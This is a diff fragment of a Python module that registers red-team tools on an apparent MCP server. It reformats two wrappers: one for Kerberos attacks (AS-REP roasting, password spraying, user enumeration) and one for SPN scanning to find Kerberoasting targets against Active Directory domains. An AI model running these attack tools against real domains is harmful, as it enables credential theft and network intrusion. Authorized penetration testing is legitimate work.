     def ad_kerberos_attack(
-        domain: str,
-        dc_ip: str,
-        attack_type: str,
-        targets: str,
-        password: str = ""
+        domain: str, dc_ip: str, attack_type: str, targets: str, password: str = ""
     ) -> str:
         """Kerberos攻击 - AS-REP Roasting/密码喷洒/用户枚举
 
@@ -1447,26 +1273,18 @@ def register_redteam_tools(mcp):
                 attack_type=attack_type,
                 targets=target_list,
                 password=password,
-                verbose=False
+                verbose=False,
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("ad_kerberos_attack")
 
     @mcp.tool()
-    def ad_spn_scan(
-        domain: str,
-        dc_ip: str = "",
-        username: str = "",
-        password: str = ""
-    ) -> str:
+    def ad_spn_scan(domain: str, dc_ip: str = "", username: str = "", password: str = "") -> str:
         """SPN扫描 - 发现Kerberoasting目标
 
         Args:
@@ -1487,16 +1305,13 @@ def register_redteam_tools(mcp):
                 username=username,
                 password=password,
                 enum_type="spn",
-                verbose=False
+                verbose=False,
             )
 
             return json.dumps(result, indent=2, ensure_ascii=False)
 
         except Exception as e:
-            return json.dumps({
-                "success": False,
-                "error": str(e)
-            })
+            return json.dumps({"success": False, "error": str(e)})
 
     registered_tools.append("ad_spn_scan")
 
